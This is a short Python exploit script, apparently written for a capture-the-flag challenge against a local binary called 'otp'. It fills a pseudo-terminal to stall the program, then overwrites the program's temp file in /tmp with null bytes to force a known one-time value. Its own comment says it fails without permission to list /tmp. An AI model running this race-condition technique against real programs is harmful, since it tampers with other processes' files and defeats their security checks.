#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# NOTE - this exploit does not work as it requires us being able to list the /tmp dir

import os
import pathlib
import pty
import threading
import subprocess

app_master, app_slave = pty.openpty()

master, slave = os.fdopen(app_master, "rb"), os.fdopen(app_slave, "wb")

def fill_tty(slave):
    # blocks the program before it opens the second file
    slave.write(b"\n" * (1 << 20))

fill_tty_thread = threading.Thread(target=fill_tty, args=(slave,), daemon=True)
fill_tty_thread.start()

p = subprocess.Popen(["./otp", "0"], stdout=slave)

# find the tmp file and rewrite it
out_path = next(p for p in pathlib.Path("/tmp").glob("[0-9]*"))
out_path.write_bytes(b"\x00" * 8)

# unblock execution
master.read(1 << 16)
master.read(1 << 16)

# read actual program ooutput 
for _ in range(4):
    print(master.readline().strip())
